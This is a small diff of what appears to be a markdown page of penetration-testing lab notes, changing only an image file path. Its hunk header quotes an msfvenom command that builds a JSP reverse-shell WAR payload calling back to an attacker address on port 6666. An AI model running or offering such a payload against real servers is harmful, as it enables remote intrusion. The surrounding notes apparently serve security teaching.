@@ -182,7 +182,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.6.232.2 LPORT=6666 -f war -o re
 
 ![](<../../../../.gitbook/assets/image (36) (1) (1) (1).png>)
 
-![](<../../../../.gitbook/assets/image (30) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (30) (1) (1) (1).png>)
 
 ![](<../../../../.gitbook/assets/image (10).png>)
 
